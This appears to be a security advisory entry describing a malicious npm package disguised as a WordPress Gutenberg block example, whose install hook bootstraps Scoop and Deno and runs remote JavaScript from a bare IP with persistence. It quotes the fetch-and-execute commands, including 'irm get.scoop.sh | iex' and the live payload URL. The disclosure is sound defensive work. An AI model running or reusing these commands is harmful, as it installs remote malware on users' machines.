summary: Install-time bare-IP dropper installs Deno and executes remote JavaScript
details: The npm install lifecycle hook ("install": "node setup.js" in package.json) runs setup.js, which on Windows relaxes PowerShell ExecutionPolicy, pipes `irm get.scoop.sh | iex` to bootstrap Scoop (optionally with -RunAsAdmin), installs Deno via winget/scoop (`winget install --id DenoLand.Deno`), and then invokes `deno run -A http://172.94.9.157/v028f8cde892b0b74c8.js` to fetch and execute JavaScript from a bare-IP plain-HTTP URL with no pinning, hash, or signature verification. Comments in setup.js describe a staged loader ("launcher-1... a tiny eval-loop that fetches launcher-2 which sets up autorun and runs main") that establishes autorun persistence, and note that Deno streams the payload directly so no file is written locally by the package's own code. The package's README advertises a WordPress Gutenberg block example; the PowerShell + Scoop + Deno + remote-JS chain is unrelated to that stated purpose.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
